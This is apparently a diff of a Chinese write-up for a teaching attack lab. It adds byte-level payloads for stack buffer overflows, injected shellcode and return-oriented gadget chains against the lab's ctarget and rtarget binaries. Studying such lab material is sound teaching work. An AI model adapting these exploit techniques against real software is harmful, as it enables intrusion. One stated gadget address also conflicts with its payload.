@@ -10,7 +10,7 @@
 cat ans | ./hex2raw | ./ctarget -q
 ```
 
-### Level 1
+### Phase 1
 
 函数 `getbuf` 当中调用了无缓冲区溢出检查的函数 `Gets`, 它所写入的缓冲区是 `%rdi`, 而代码中只为其分配了 40 个字节:
 
@@ -42,11 +42,15 @@ cat ans | ./hex2raw | ./ctarget -q
 攻击 payload 是 40 个字节的填充以及 8 个字节的返回地址:
 
 ```
-41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
 c0 17 40 00 00 00 00 00
 ```
 
-### Level 2
+### Phase 2
 
 ```asm
 00000000004017ec <touch2>:
@@ -75,9 +79,9 @@ c0 17 40 00 00 00 00 00
 
 文档中给了提示:
 
-- You will want to position a byte representation of the address of your injected code in such a way that `ret` instruction at the end of the code for `getbuf` will transfer control to it.
+> You will want to position a byte representation of the address of your injected code in such a way that `ret` instruction at the end of the code for `getbuf` will transfer control to it.
 
-采用 LLDB 调试, 在 `getbuf` 处下断点, 由于本实验没有 ASLR, 因此看到 `%rsp` 是定值 `0x000000005561dca0`, 可以将代码注入到栈上, 通过 `ret` 到对应地址来利用.
+采用 LLDB 调试, 在 `getbuf` 处下断点, 因此看到 `%rsp` 是定值 `0x000000005561dca0`, 可以将代码注入到栈上, 通过 `ret` 到对应地址来利用.
 
 在栈上注入的代码为:
 
@@ -98,7 +102,7 @@ c3
 78 dc 61 55 00 00 00 00
 ```
 
-### Level 3
+### Phase 3
 
 `touch3` 接受一个存储有 `cookie` 字符串的地址, 在之前, 我们只修改过寄存器, 这次还需要修改栈内容, 并且注意到提示:
 
@@ -109,17 +113,120 @@ c3
 攻击 payload 是:
 
 ```
+48 c7 c7 a8 dc 61 55
+68 fa 18 40 00
+c3
+41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+执行时, `getbuf` 首先返回到 `0x5561dc78`, 这个位置接下来执行 shellcode:
+
+```
 0000000000000000 <.text>:
    0:	48 c7 c7 a8 dc 61 55 	movq   $0x5561dca8,%rdi
    7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   	retq
 ```
 
+由于 `touch3` 传递的第一个参数是字符串的地址, 这里把字符串放在栈上, 并且将地址 `0x5561dca8` 赋给 `%rdi`.
+
+## rtarget
+
+### Phase 4
+
+本次的要求同样是触发 touch2, 但这次栈不再能够执行了, 需要利用 gadget. 回忆之前的代码:
+
 ```
-48 c7 c7 a8 dc 61 55
-68 fa 18 40 00
-c3
-41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
-78 dc 61 55 00 00 00 00
+0000000000000000 <.text>:
+   0:	bf fa 97 b9 59       	movl   $0x59b997fa,%edi
+   5:	68 ec 17 40 00       	pushq  $0x4017ec
+   a:	c3                   	retq
+```
+
+根据提示, 需要在 payload 里面写入 gadget 的地址, 并利用 popq 指令把值写入 `%edi`.
+
+因此, 这次的代码应该是:
+
+```
+popq %rax
+nop
+ret
+
+movl %eax,%edi
+nop
+ret
+```
+
+攻击字符串为 40B 的填充, 以及地址和数据: `0x4019b1`, `0x59b997fa`, `0x4019c6`. 最后跳转到 touch2: `0x4017ec`.
+
+组合后最终的 payload 是:
+
+```
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c6 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+### Phase 5
+
+文档提到参考答案用了 8 个 gadget. 采用技术和上一个并没什么不同.
+
+因为栈指针是随机化的, 所以不能直接计算栈上字符串的地址了, 也许可以将 `%rsp`
+的值赋给变量, 比如 `movq %rsp,%rax`. 但能找到的 gadget 在这一步过后都会 `ret`.
+
+所以, 注意到 `farm.c` 里面有 `long add_xy(long, long)` 这个函数可以利用.
+
+以下是攻击的思路:
+
+```
+movq %rsp,%rax
+movq %rax,%rdi
+popq %rax
+movl %eax,%edx
+movl %edx,%ecx
+movl %ecx,%esi
+leaq (%rdi,%rsi,1),%rax
+movq %rax,%rdi
+```
+
+可以看到, 难点在于从 `popq %rax` 到把 `eax` 赋给 `%esi`. 这需要找出单向图中的路径.
+
+最后的 payload 是
+
+```
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+
+48 00 00 00 00 00 00 00
+
+dd 19 40 00 00 00 00 00
+69 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+
 35 39 62 39 39 37 66 61
 ```
+
+其中 `popq %rax` 弹出的值是 `0x48 = 72`,
+这是因为从 `movq %rsp,%rax` 到字符串的地址相差 9 条指令.
